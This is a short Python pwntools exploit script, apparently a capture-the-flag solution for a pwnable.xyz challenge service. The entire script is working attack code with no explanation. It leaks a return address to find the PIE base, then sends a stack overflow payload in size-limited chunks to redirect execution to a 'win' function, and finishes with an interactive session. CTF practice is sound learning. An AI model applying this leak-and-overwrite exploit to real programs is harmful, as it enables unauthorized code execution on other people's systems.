#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30014)

global size
while(1):
    p.sendafter("> ", '2')
    p.recvuntil("Give me ")
    size = int(p.recvuntil(" "))
    if size >= 14:
        p.sendafter(": ", 'A'*8)
        p.sendafter("> ", '3')
        p.recvuntil('A'*8)
        ret = u64(p.recv(6)+"\x00\x00")
        pie = ret - 0xbc2
        log.info("ret : "+hex(ret))
        log.info("pie : "+hex(pie))
        break
    else:
        continue

win = pie + 0xb57

pay = 'B'*(0x408-size) + p64(win)
begin = 0

while(1):
    p.sendafter("> ", '2')
    p.recvuntil("Give me ")
    size2 = int(p.recvuntil(" "))
    end = begin + size2
    if size2 == 0: 
        continue
    p.sendafter(": ", pay[begin:end])
    begin = end
    print end
    if end >= 1026:
        break

p.sendafter("> ", '0')

p.interactive()
